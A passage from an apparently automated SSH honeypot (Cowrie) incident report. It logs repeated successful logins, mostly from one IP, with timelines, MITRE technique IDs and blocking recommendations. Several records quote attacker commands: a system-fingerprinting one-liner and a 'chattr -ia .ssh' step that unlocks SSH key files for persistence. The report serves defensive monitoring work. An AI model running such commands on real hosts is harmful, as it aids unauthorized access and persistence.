| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:23:34` | `cowrie.session.connect` |
| `2026-08-11 07:23:34` | `cowrie.client.version` |
| `2026-08-11 07:23:34` | `cowrie.client.kex` |
| `2026-08-11 07:23:36` | `cowrie.login.success` |
| `2026-08-11 07:23:38` | `cowrie.session.params` |
| `2026-08-11 07:23:38` | `cowrie.command.input` |
| `2026-08-11 07:23:38` | `cowrie.command.input` |
| `2026-08-11 07:23:38` | `cowrie.command.input` |
| `2026-08-11 07:23:38` | `cowrie.command.input` |
| `2026-08-11 07:23:38` | `cowrie.command.input` |
| `2026-08-11 07:23:38` | `cowrie.command.success` |
| `2026-08-11 07:23:38` | `cowrie.command.input` |
| `2026-08-11 07:23:38` | `cowrie.command.input` |
| `2026-08-11 07:23:38` | `cowrie.command.input` |
| `2026-08-11 07:23:38` | `cowrie.command.input` |
| `2026-08-11 07:23:38` | `cowrie.log.closed` |
| `2026-08-11 07:23:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c62caabc8e8e

| Field | Detail |
|---|---|
| **Source IP** | `220.180.166[.]214` |
| **First Seen** | 2026-08-11 07:25 |
| **Last Seen** | 2026-08-11 07:25 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:25:01` | `cowrie.session.connect` |
| `2026-08-11 07:25:02` | `cowrie.client.version` |
| `2026-08-11 07:25:02` | `cowrie.client.kex` |
| `2026-08-11 07:25:05` | `cowrie.login.success` |
| `2026-08-11 07:25:06` | `cowrie.direct-tcpip.request` |
| `2026-08-11 07:25:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.180.166[.]214` to AbuseIPDB if not already reported
- [ ] Block `220.180.166[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7e976a2ea9b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 07:25 |
| **Last Seen** | 2026-08-11 07:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:25:40` | `cowrie.session.connect` |
| `2026-08-11 07:25:40` | `cowrie.client.version` |
| `2026-08-11 07:25:40` | `cowrie.client.kex` |
| `2026-08-11 07:25:42` | `cowrie.login.success` |
| `2026-08-11 07:25:43` | `cowrie.session.params` |
| `2026-08-11 07:25:43` | `cowrie.command.input` |
| `2026-08-11 07:25:43` | `cowrie.command.input` |
| `2026-08-11 07:25:43` | `cowrie.command.input` |
| `2026-08-11 07:25:43` | `cowrie.command.input` |
| `2026-08-11 07:25:43` | `cowrie.command.input` |
| `2026-08-11 07:25:43` | `cowrie.command.success` |
| `2026-08-11 07:25:43` | `cowrie.command.input` |
| `2026-08-11 07:25:43` | `cowrie.command.input` |
| `2026-08-11 07:25:43` | `cowrie.command.input` |
| `2026-08-11 07:25:43` | `cowrie.command.input` |
| `2026-08-11 07:25:43` | `cowrie.log.closed` |
| `2026-08-11 07:25:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cd0257477f8

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 07:27 |
| **Last Seen** | 2026-08-11 07:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:27:44` | `cowrie.session.connect` |
| `2026-08-11 07:27:45` | `cowrie.client.version` |
| `2026-08-11 07:27:45` | `cowrie.client.kex` |
| `2026-08-11 07:27:46` | `cowrie.login.success` |
| `2026-08-11 07:27:48` | `cowrie.session.params` |
| `2026-08-11 07:27:48` | `cowrie.command.input` |
| `2026-08-11 07:27:48` | `cowrie.command.input` |
| `2026-08-11 07:27:48` | `cowrie.command.input` |
| `2026-08-11 07:27:48` | `cowrie.command.input` |
| `2026-08-11 07:27:48` | `cowrie.command.input` |
| `2026-08-11 07:27:48` | `cowrie.command.success` |
| `2026-08-11 07:27:48` | `cowrie.command.input` |
| `2026-08-11 07:27:48` | `cowrie.command.input` |
| `2026-08-11 07:27:48` | `cowrie.command.input` |
| `2026-08-11 07:27:48` | `cowrie.command.input` |
| `2026-08-11 07:27:48` | `cowrie.log.closed` |
| `2026-08-11 07:27:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-482dccdcff53

| Field | Detail |
|---|---|
| **Source IP** | `124.70.97[.]100` |
| **First Seen** | 2026-08-11 07:29 |
| **Last Seen** | 2026-08-11 07:34 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:29:26` | `cowrie.session.connect` |
| `2026-08-11 07:29:26` | `cowrie.client.version` |
| `2026-08-11 07:29:26` | `cowrie.client.kex` |
| `2026-08-11 07:29:27` | `cowrie.login.success` |
| `2026-08-11 07:29:28` | `cowrie.session.params` |
| `2026-08-11 07:29:28` | `cowrie.command.input` |
| `2026-08-11 07:29:28` | `cowrie.command.failed` |
| `2026-08-11 07:29:29` | `cowrie.log.closed` |
| `2026-08-11 07:34:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.70.97[.]100` to AbuseIPDB if not already reported
- [ ] Block `124.70.97[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28a86d6fd7f0

| Field | Detail |
|---|---|
| **Source IP** | `124.70.97[.]100` |
| **First Seen** | 2026-08-11 07:29 |
| **Last Seen** | 2026-08-11 07:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:29:37` | `cowrie.session.connect` |
| `2026-08-11 07:29:37` | `cowrie.client.version` |
| `2026-08-11 07:29:37` | `cowrie.client.kex` |
| `2026-08-11 07:29:38` | `cowrie.login.success` |
| `2026-08-11 07:29:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.70.97[.]100` to AbuseIPDB if not already reported
- [ ] Block `124.70.97[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-377e6ef21c94

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 07:29 |
| **Last Seen** | 2026-08-11 07:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:29:46` | `cowrie.session.connect` |
| `2026-08-11 07:29:47` | `cowrie.client.version` |
| `2026-08-11 07:29:47` | `cowrie.client.kex` |
| `2026-08-11 07:29:48` | `cowrie.login.success` |
| `2026-08-11 07:29:50` | `cowrie.session.params` |
| `2026-08-11 07:29:50` | `cowrie.command.input` |
| `2026-08-11 07:29:50` | `cowrie.command.input` |
| `2026-08-11 07:29:50` | `cowrie.command.input` |
| `2026-08-11 07:29:50` | `cowrie.command.input` |
| `2026-08-11 07:29:50` | `cowrie.command.input` |
| `2026-08-11 07:29:50` | `cowrie.command.success` |
| `2026-08-11 07:29:50` | `cowrie.command.input` |
| `2026-08-11 07:29:50` | `cowrie.command.input` |
| `2026-08-11 07:29:50` | `cowrie.command.input` |
| `2026-08-11 07:29:50` | `cowrie.command.input` |
| `2026-08-11 07:29:51` | `cowrie.log.closed` |
| `2026-08-11 07:29:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1ec0b9d6fbd

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 07:31 |
| **Last Seen** | 2026-08-11 07:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:31:48` | `cowrie.session.connect` |
| `2026-08-11 07:31:48` | `cowrie.client.version` |
| `2026-08-11 07:31:48` | `cowrie.client.kex` |
| `2026-08-11 07:31:50` | `cowrie.login.success` |
| `2026-08-11 07:31:52` | `cowrie.session.params` |
| `2026-08-11 07:31:52` | `cowrie.command.input` |
| `2026-08-11 07:31:52` | `cowrie.command.input` |
| `2026-08-11 07:31:52` | `cowrie.command.input` |
| `2026-08-11 07:31:52` | `cowrie.command.input` |
| `2026-08-11 07:31:52` | `cowrie.command.input` |
| `2026-08-11 07:31:52` | `cowrie.command.success` |
| `2026-08-11 07:31:52` | `cowrie.command.input` |
| `2026-08-11 07:31:52` | `cowrie.command.input` |
| `2026-08-11 07:31:52` | `cowrie.command.input` |
| `2026-08-11 07:31:52` | `cowrie.command.input` |
| `2026-08-11 07:31:53` | `cowrie.log.closed` |
| `2026-08-11 07:31:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18462d828340

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 07:33 |
| **Last Seen** | 2026-08-11 07:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:33:52` | `cowrie.session.connect` |
| `2026-08-11 07:33:52` | `cowrie.client.version` |
| `2026-08-11 07:33:52` | `cowrie.client.kex` |
| `2026-08-11 07:33:54` | `cowrie.login.success` |
| `2026-08-11 07:33:55` | `cowrie.session.params` |
| `2026-08-11 07:33:55` | `cowrie.command.input` |
| `2026-08-11 07:33:55` | `cowrie.command.input` |
| `2026-08-11 07:33:55` | `cowrie.command.input` |
| `2026-08-11 07:33:55` | `cowrie.command.input` |
| `2026-08-11 07:33:55` | `cowrie.command.input` |
| `2026-08-11 07:33:55` | `cowrie.command.success` |
| `2026-08-11 07:33:55` | `cowrie.command.input` |
| `2026-08-11 07:33:55` | `cowrie.command.input` |
| `2026-08-11 07:33:55` | `cowrie.command.input` |
| `2026-08-11 07:33:55` | `cowrie.command.input` |
| `2026-08-11 07:33:55` | `cowrie.log.closed` |
| `2026-08-11 07:33:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-137ca04ef814

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 07:35 |
| **Last Seen** | 2026-08-11 07:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:35:57` | `cowrie.session.connect` |
| `2026-08-11 07:35:57` | `cowrie.client.version` |
| `2026-08-11 07:35:57` | `cowrie.client.kex` |
| `2026-08-11 07:35:59` | `cowrie.login.success` |
| `2026-08-11 07:36:00` | `cowrie.session.params` |
| `2026-08-11 07:36:00` | `cowrie.command.input` |
| `2026-08-11 07:36:00` | `cowrie.command.input` |
| `2026-08-11 07:36:00` | `cowrie.command.input` |
| `2026-08-11 07:36:00` | `cowrie.command.input` |
| `2026-08-11 07:36:00` | `cowrie.command.input` |
| `2026-08-11 07:36:00` | `cowrie.command.success` |
| `2026-08-11 07:36:00` | `cowrie.command.input` |
| `2026-08-11 07:36:00` | `cowrie.command.input` |
| `2026-08-11 07:36:00` | `cowrie.command.input` |
| `2026-08-11 07:36:00` | `cowrie.command.input` |
| `2026-08-11 07:36:01` | `cowrie.log.closed` |
| `2026-08-11 07:36:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-246374814e61

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 07:38 |
| **Last Seen** | 2026-08-11 07:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:38:14` | `cowrie.session.connect` |
| `2026-08-11 07:38:14` | `cowrie.client.version` |
| `2026-08-11 07:38:14` | `cowrie.client.kex` |
| `2026-08-11 07:38:15` | `cowrie.login.success` |
| `2026-08-11 07:38:16` | `cowrie.session.params` |
| `2026-08-11 07:38:16` | `cowrie.command.input` |
| `2026-08-11 07:38:16` | `cowrie.command.input` |
| `2026-08-11 07:38:16` | `cowrie.command.input` |
| `2026-08-11 07:38:16` | `cowrie.command.input` |
| `2026-08-11 07:38:16` | `cowrie.command.input` |
| `2026-08-11 07:38:16` | `cowrie.command.success` |
| `2026-08-11 07:38:16` | `cowrie.command.input` |
| `2026-08-11 07:38:16` | `cowrie.command.input` |
| `2026-08-11 07:38:16` | `cowrie.command.input` |
| `2026-08-11 07:38:16` | `cowrie.command.input` |
| `2026-08-11 07:38:16` | `cowrie.log.closed` |
| `2026-08-11 07:38:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e520f2ae0aa

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 07:40 |
| **Last Seen** | 2026-08-11 07:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:40:37` | `cowrie.session.connect` |
| `2026-08-11 07:40:37` | `cowrie.client.version` |
| `2026-08-11 07:40:37` | `cowrie.client.kex` |
| `2026-08-11 07:40:38` | `cowrie.login.success` |
| `2026-08-11 07:40:39` | `cowrie.session.params` |
| `2026-08-11 07:40:39` | `cowrie.command.input` |
| `2026-08-11 07:40:39` | `cowrie.command.input` |
| `2026-08-11 07:40:39` | `cowrie.command.input` |
| `2026-08-11 07:40:39` | `cowrie.command.input` |
| `2026-08-11 07:40:39` | `cowrie.command.input` |
| `2026-08-11 07:40:39` | `cowrie.command.success` |
| `2026-08-11 07:40:39` | `cowrie.command.input` |
| `2026-08-11 07:40:39` | `cowrie.command.input` |
| `2026-08-11 07:40:39` | `cowrie.command.input` |
| `2026-08-11 07:40:39` | `cowrie.command.input` |
| `2026-08-11 07:40:39` | `cowrie.log.closed` |
| `2026-08-11 07:40:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5a1f662b288

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 07:42 |
| **Last Seen** | 2026-08-11 07:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:42:48` | `cowrie.session.connect` |
| `2026-08-11 07:42:48` | `cowrie.client.version` |
| `2026-08-11 07:42:48` | `cowrie.client.kex` |
| `2026-08-11 07:42:50` | `cowrie.login.success` |
| `2026-08-11 07:42:52` | `cowrie.session.params` |
| `2026-08-11 07:42:52` | `cowrie.command.input` |
| `2026-08-11 07:42:52` | `cowrie.command.input` |
| `2026-08-11 07:42:52` | `cowrie.command.input` |
| `2026-08-11 07:42:52` | `cowrie.command.input` |
| `2026-08-11 07:42:52` | `cowrie.command.input` |
| `2026-08-11 07:42:52` | `cowrie.command.success` |
| `2026-08-11 07:42:52` | `cowrie.command.input` |
| `2026-08-11 07:42:52` | `cowrie.command.input` |
| `2026-08-11 07:42:52` | `cowrie.command.input` |
| `2026-08-11 07:42:52` | `cowrie.command.input` |
| `2026-08-11 07:42:53` | `cowrie.log.closed` |
| `2026-08-11 07:42:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b042838e6bf5

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 07:44 |
| **Last Seen** | 2026-08-11 07:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 07:44:46` | `cowrie.session.connect` |
| `2026-08-11 07:44:47` | `cowrie.client.version` |
| `2026-08-11 07:44:47` | `cowrie.client.kex` |
| `2026-08-11 07:44:49` | `cowrie.login.success` |
| `2026-08-11 07:44:51` | `cowrie.session.params` |
| `2026-08-11 07:44:51` | `cowrie.command.input` |
| `2026-08-11 07:44:51` | `cowrie.command.input` |
| `2026-08-11 07:44:51` | `cowrie.command.input` |
| `2026-08-11 07:44:51` | `cowrie.command.input` |
| `2026-08-11 07:44:51` | `cowrie.command.input` |
| `2026-08-11 07:44:51` | `cowrie.command.success` |
| `2026-08-11 07:44:51` | `cowrie.command.input` |
| `2026-08-11 07:44:51` | `cowrie.command.input` |
| `2026-08-11 07:44:51` | `cowrie.command.input` |
| `2026-08-11 07:44:51` | `cowrie.command.input` |
